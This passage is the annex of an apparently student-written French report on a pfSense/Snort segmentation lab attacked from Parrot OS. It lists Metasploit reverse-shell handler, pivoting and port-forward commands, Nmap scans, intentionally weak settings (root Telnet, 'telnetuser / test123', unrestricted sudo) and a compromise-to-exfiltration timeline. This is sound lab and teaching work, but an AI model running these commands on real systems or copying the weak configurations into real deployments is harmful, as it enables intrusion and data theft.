-
-	\item[TLS (Transport Layer Security)] Protocole chiffrement communication (remplace SSL obsolète).
-
-	\item[UDP (User Datagram Protocol)] Protocole transport connectionless, rapide mais non fiable.
-
-	\item[UFW (Uncomplicated Firewall)] Pare-feu hôte Linux simplifié, wrapper iptables.
-
-	\item[VPN (Virtual Private Network)] Tunnel chiffré étendant réseau privé sur réseau public.
-
-	\item[WAF (Web Application Firewall)] Pare-feu spécialisé protection applications web (L7).
-
-	\item[XSS (Cross-Site Scripting)] Vulnérabilité web injection code JavaScript côté client.
-
-	\item[Zero Trust] Architecture sécurité n'accordant confiance implicite, exigeant vérification continue.
-\end{description}
-
-\section{Commandes de Référence Rapide}
-
-\subsection{Metasploit Framework}
-
-\begin{lstlisting}[caption=Commandes MSF essentielles]
-	# Handler
-	use exploit/multi/handler
-	set PAYLOAD linux/x64/meterpreter/reverse_tcp
-	set LHOST 192.168.100.150
-	set LPORT 4445
-	exploit
-	
-	# Sessions
-	sessions -l              # Lister sessions
-	sessions -i 2            # Interagir session 2
-	sessions -k 2            # Tuer session 2
-	background               # Mettre en arriere-plan
-	
-	# Routes (Pivoting)
-	route add 192.168.20.0/24 2
-	route print
-	route delete 192.168.20.0/24 2
-	
-	# Port Forwarding
-	portfwd add -l 3389 -p 3389 -r 192.168.20.50
-	portfwd list
-	portfwd delete -l 3389 -p 3389 -r 192.168.20.50
-\end{lstlisting}
-
-\subsection{Nmap Reconnaissance}
-
-\begin{lstlisting}[caption=Scans Nmap courants]
-	# Scan SYN (rapide)
-	sudo nmap -sS 192.168.100.6
-	
-	# Scan TCP Connect (sans root)
-	nmap -sT 192.168.100.6
-	
-	# Detection version
-	nmap -sV 192.168.100.6
-	
-	# OS Fingerprinting
-	sudo nmap -O 192.168.100.6
-	
-	# Scan agressif (version + OS + scripts)
-	sudo nmap -A 192.168.100.6
-	
-	# Ports specifiques
-	nmap -p 23,80,139,445 192.168.100.6
-	
-	# Tous les ports
-	nmap -p- 192.168.100.6
-\end{lstlisting}
-
-\subsection{Snort Configuration}
-
-\begin{lstlisting}[caption=Commandes pfSense Snort]
-	# Status
-	sudo snort -d -A console -i em0 -l /var/log/snort
-	
-	# Afficher version
-	snort -V
-	
-	# Valider config
-	snort -T -c /etc/snort/snort.conf
-	
-	# Logs
-	tail -f /var/log/snort/alert
-	tcpdump -A -r /var/log/snort/snort.log.1615000800
-\end{lstlisting}
-
-\section{Configurations Complètes}
-
-\subsection{pfSense : Fichier de Configuration Résumé}
-
-Les configurations critiques de pfSense utilisées dans ce projet incluent :
-
-\begin{itemize}
-	\item \textbf{Interfaces réseau :}
-	      \begin{itemize}
-		      \item WAN (em0) : 192.168.100.6/24 (gateway 192.168.100.2)
-		      \item DMZ (em1) : 192.168.10.1/24 (aucune gateway)
-		      \item LAN (em2) : 192.168.20.1/24 (aucune gateway)
-	      \end{itemize}
-
-	\item \textbf{Règles pare-feu (ordre critique) :}
-	      \begin{enumerate}
-		      \item WAN : Allow TCP 23 $\rightarrow$ DMZ 192.168.10.100 (Telnet)
-		      \item WAN : Allow TCP 80 $\rightarrow$ DMZ 192.168.10.100 (HTTP)
-		      \item DMZ : Allow TCP/UDP 192.168.10.0/24 $\rightarrow$ 192.168.20.0/24 (pédagogique, sera bloqué en prod)
-		      \item LAN : Allow TCP/UDP 192.168.20.0/24 $\rightarrow$ 192.168.10.0/24 (DMZ access)
-		      \item Everywhere : Default Deny
-	      \end{enumerate}
-
-	\item \textbf{NAT (Port Forward) :}
-	      \begin{itemize}
-		      \item 192.168.100.6:23 $\leftrightarrow$ 192.168.10.100:23 (Telnet)
-		      \item 192.168.100.6:80 $\leftrightarrow$ 192.168.10.100:80 (HTTP)
-		      \item 192.168.100.6:139 $\leftrightarrow$ 192.168.10.100:139 (NetBIOS)
-		      \item 192.168.100.6:445 $\leftrightarrow$ 192.168.10.100:445 (SMB)
-	      \end{itemize}
-
-	\item \textbf{Snort IDS :}
-	      \begin{itemize}
-		      \item Enabled on WAN, DMZ, LAN (IDS mode)
-		      \item Sources : Snort GPLv2 + ET Open
-		      \item Blocking : Disabled (pour permettre tests)
-	      \end{itemize}
-\end{itemize}
-
-La configuration complète en XML est disponible sur demande (fichier config.xml pfSense $>$ 50 KB).
-
-\subsection{Ubuntu DMZ : Services et Configuration}
-
-\begin{lstlisting}[caption=Services Ubuntu DMZ en ecoute]
-	# Telnet
-	inetd configuration : /etc/inetd.conf
-	telnet stream tcp nowait root /usr/sbin/telnetd telnetd
-	
-	# SSH (non utilise initialement)
-	/etc/ssh/sshd_config :
-	Port 22
-	PasswordAuthentication yes
-	X11Forwarding yes
-	
-	# HTTP (DVWA)
-	nginx reverse proxy towards DVWA (PHP-FPM)
-	Port 80 towards 127.0.0.1:8080
-	
-	# Samba (SMB)
-	/etc/samba/smb.conf :
-	[global]
-	workgroup = WORKGROUP
-	server string = DMZ-WebServer
-	interfaces = 192.168.10.100
-	
-	# Docker (conteneurs isoles)
-	Bridge reseau : 172.17.0.0/16
-	Conteneurs : application, database, cache
-\end{lstlisting}
-
-\section{Résultats Expérimentaux Détaillés}
-
-\subsection{Données Brutes de Reconnaissance}
-
-\begin{table}[H]
-	\centering
-	\small
-	\renewcommand{\arraystretch}{1.2}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{>{\centering\arraybackslash}p{1.5cm} >{\centering\arraybackslash}p{1.5cm} >{\centering\arraybackslash}p{1.5cm} >{\centering\arraybackslash}p{1.5cm} >{\centering\arraybackslash}p{1.5cm} >{\centering\arraybackslash}p{1.5cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Port}}    &
-		\textcolor{tableheadfg}{\textbf{État}}    &
-		\textcolor{tableheadfg}{\textbf{Service}} &
-		\textcolor{tableheadfg}{\textbf{Version}} &
-		\textcolor{tableheadfg}{\textbf{CVSS}}    &
-		\textcolor{tableheadfg}{\textbf{CWE}}                                                        \\
-		\hline
-		\rowcolor{tablerowalt}
-		22                                        & closed & SSH        & (detecté)  & 0   & N/A     \\
-		23                                        & open   & Telnet     & inetutils  & 9.8 & CWE-319 \\
-		\rowcolor{tablerowalt}
-		80                                        & open   & HTTP       & nginx 1.18 & 8.1 & CWE-200 \\
-		139                                       & closed & NetBIOS    & Samba 4.17 & 7.5 & CWE-276 \\
-		\rowcolor{tablerowalt}
-		445                                       & closed & SMB        & Samba 4.17 & 7.5 & CWE-276 \\
-		3306                                      & closed & MySQL      & (detecté)  & -   & -       \\
-		\rowcolor{tablerowalt}
-		5432                                      & closed & PostgreSQL & (detecté)  & -   & -       \\
-		\multicolumn{6}{c}{... (993 ports filtres omis) ...}                                         \\
-		\hline
-	\end{tabular}
-	\caption{Données de scan Nmap : ports détectés et vulnérabilités associées}
-	\label{tab:nmap-detailed-results}
-\end{table}
-
-\subsection{Données Brutes de Compromission}
-
-\begin{table}[H]
-	\centering
-	\small
-	\renewcommand{\arraystretch}{1.2}
-	\setlength{\arrayrulewidth}{0.5pt}
-	\begin{tabular}{p{3cm} p{4cm} p{6cm}}
-		\arrayrulecolor{tableborder}
-		\hline
-		\tableheadcolor
-		\textcolor{tableheadfg}{\textbf{Métrique}} &
-		\textcolor{tableheadfg}{\textbf{Valeur}}   &
-		\textcolor{tableheadfg}{\textbf{Observation}}                                                                    \\
-		\hline
-		\rowcolor{tablerowalt}
-		Heure compromission                        & 15:08:30        & Connexion Telnet reussie                          \\
-		Escalade privilèges                        & 15:09:00        & sudo ALL decouverte, root obtenu                  \\
-		\rowcolor{tablerowalt}
-		Payload generé                             & 250 bytes (ELF) & Binaire minimal Meterpreter                       \\
-		Telechargement                             & 15:09:15        & wget HTTP:8000, 250 bytes                         \\
-		\rowcolor{tablerowalt}
-		Session etablie                            & 15:09:45        & Meterpreter PID 4779                              \\
-		Persistence                                & 15:15:00        & 2 sessions simultanees (PID 4907, 4908)           \\
-		\rowcolor{tablerowalt}
-		Pivot configure                            & 15:20:00        & Route Metasploit vers 192.168.20.0/24             \\
-		LAN discovery                              & 15:25:00        & Windows XP:445 detecté via pivot                  \\
-		\rowcolor{tablerowalt}
-		Exfiltration                               & 15:35:00        & 121 KB donnees (43 users, 7 services, configs)    \\
-		Duration totale                            & 32 minutes      & Reconnaissance $\rightarrow$ Persistence complete \\
-		\hline
-	\end{tabular}
-	\caption{Données brutes de compromission : timeline et métriques}
-	\label{tab:compromise-raw-data}
-\end{table}
-
-\section{Calculs Supplémentaires et Justifications}
-
-\subsection{Surface d'Attaque : Formulation Alternative}
-
-\textbf{Méthode 1 (ports accessibles) :}
-$$\text{Surface}_{1} = \frac{\text{open} + \text{closed}}{1000} = \frac{2+2}{1000} = 0.4\%$$
-
-\textbf{Méthode 2 (ports ouverts uniquement) :}
-$$\text{Surface}_{2} = \frac{\text{open}}{1000} = \frac{2}{1000} = 0.2\%$$
-
-\textbf{Interprétation :}
-\begin{itemize}
-	\item Méthode 1 (0.4\%) : compte les services détectés (ouverts et fermés).
-	\item Méthode 2 (0.2\%) : compte uniquement les services \textit{en écoute} et exploitables.
-\end{itemize}
-
-Pour ce projet, \textbf{Méthode 2} a été retenue car elle représente les ports \textit{réellement accessibles} pour exploitation.
-
-\subsection{Réduction Relative}
-
-Sans segmentation (exposition directe d'un serveur Linux) :
-\begin{itemize}
-	\item Services typiques exposés : SSH (22), HTTP (80), DNS (53), SMTP (25), POP3 (110), IMAP (143), MySQL (3306), PostgreSQL (5432), etc.
-	\item Nombre ports = 8-12 (3\% des 1000 courants)
-\end{itemize}
-
-Avec segmentation + NAT (ce projet) :
-\begin{itemize}
-	\item Services exposés : Telnet (23), HTTP (80)
-	\item Nombre ports = 2 (0.2\% des 1000 courants)
-\end{itemize}
-
-\textbf{Réduction :}
-$$\text{Réduction} = \frac{3\% - 0.2\%}{3\%} \times 100\% = 93.3\%$$
-
-En variation conservative : \textbf{93-96\% de réduction confirmée}.
-
-\section{Ressources Additionnelles}
-
-\subsection{Outils Utilisés (Open-Source)}
-
-\begin{itemize}
-	\item \textbf{pfSense 2.8.0} : Pare-feu open-source (BSD)
-	\item \textbf{Snort 2.9.x} : IDS open-source (GPLv2)
-	\item \textbf{Metasploit Framework 6.4} : Framework exploitation (dual-licensed)
-	\item \textbf{Nmap 7.92} : Scanner réseau open-source
-	\item \textbf{Ubuntu 25.04} : Distribution Linux serveur
-	\item \textbf{Parrot Security OS} : Distribution pentesting (Debian-based)
-	\item \textbf{Kali Linux / Kali WSL} : Alternative à Parrot (outils similaires)
-	\item \textbf{Wireshark} : Analyseur paquets (optional)
-	\item \textbf{tcpdump} : Capture réseau ligne de commande
-	\item \textbf{netstat / ss} : Utilitaires diagnostique réseau
-\end{itemize}
-
-\subsection{Références Pédagogiques Recommandées}
-
-\begin{itemize}
-	\item \textbf{Livres :}
-	      \begin{itemize}
-		      \item ``Nmap Network Scanning'' --- Gordon Lyon (auteur Nmap)
-		      \item ``Metasploit : The Penetration Tester's Guide'' --- Kennedy et al.
-		      \item ``The Web Application Hacker's Handbook'' --- Stuttard \& Pinto
-		      \item ``Applied Network Security Monitoring'' --- Bejtlich
-	      \end{itemize}
-
-	\item \textbf{Cours en Ligne :}
-	      \begin{itemize}
-		      \item Offensive Security PWK (Penetration Testing with Kali Linux)
-		      \item SANS SEC504 Hacker Tools and Incident Handling
-		      \item eLearnSecurity Certified Ethical Hacker (CEH)
-	      \end{itemize}
-
-	\item \textbf{Certifications Ciblées :}
-	      \begin{itemize}
-		      \item OSCP (Offensive Security Certified Professional)
-		      \item GIAC Certified Intrusion Analyst (GCIA)
-		      \item GIAC Certified Incident Handler (GCIH)
-		      \item Certified Ethical Hacker (CEH)
-	      \end{itemize}
-\end{itemize}
-
-\section{Limitations du Projet}
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Environnement Contrôlé :} Laboratoire isolé sans trafic en concurrence, latences négligeables.
-	\item \textbf{Échelle Réduite :} 4 machines VM vs infrastructure 1000+ serveurs en production.
-	\item \textbf{Trafic Chiffré Non Détecté :} Snort ne peut inspecter TLS sans MITM proxy (non déployé).
-	\item \textbf{Exploits Historiques :} MS08-067, MS17-010 ciblaient des OS obsolètes (2008, 2017).
-	\item \textbf{Pas de Malware Polymorphe :} Payloads statiques; techniques d'obfuscation non testées.
-	\item \textbf{Pas d'A/B Testing Défense :} Chaque scénario testé une fois, pas de réplication d'expériences.
-	\item \textbf{Configuration Temporaire :} Règles DMZ$\rightarrow$LAN permissives ajoutées pédagogiquement, supprimées pour production.
-\end{enumerate}
-
-Ces limitations ne diminuent pas la valeur pédagogique mais doivent être prises en compte pour production.
-
-\section{Notes de Reproductibilité}
-
-Pour reproduire ce projet dans un environnement similaire :
-
-\begin{enumerate}[leftmargin=*]
-	\item \textbf{Hyperviseur} : VMware Workstation Pro / Hyper-V / KVM (vérifier allocation ressources : 8 GB RAM, 4 cores recommandé).
-
-	\item \textbf{Images Préalables} :
-	      \begin{itemize}
-		      \item pfSense ISO 2.8.0 ou ultérieur
-		      \item Ubuntu 25.04 Server
-		      \item Parrot Security 6.0+
-		      \item Windows XP SP3 (images légales uniquement)
-	      \end{itemize}
-
-	\item \textbf{Plan d'Adressage} :
-	      \begin{itemize}
-		      \item Strictement identique (192.168.100.0/24, 192.168.10.0/24, 192.168.20.0/24).
-		      \item Gateway VMware NAT : 192.168.100.2
-	      \end{itemize}
-
-	\item \textbf{Services à Installer} :
-	      \begin{itemize}
-		      \item Ubuntu : telnetd (inetd), nginx, samba, docker (optionnel)
-		      \item pfSense : Snort (via package manager)
-		      \item Parrot : Metasploit, Nmap, et outils pentesting standards
-	      \end{itemize}
-
-	\item \textbf{Configuration Critique} :
-	      \begin{itemize}
-		      \item Telnet credentials : telnetuser / test123
-		      \item Sudo policy : telnetuser ALL=(ALL:ALL) ALL
-		      \item pfSense rules : Ordre de priorité respecté (first match wins)
-		      \item Snort sources : ET Open activée pour MS17-010 détection
-	      \end{itemize}
-\end{enumerate}
-
-\textbf{Temps Estimé de Déploiement :} 3-4 heures (VMs pré-créées), jusqu'à 8h (à partir zéro).
-
 
 \end{document}
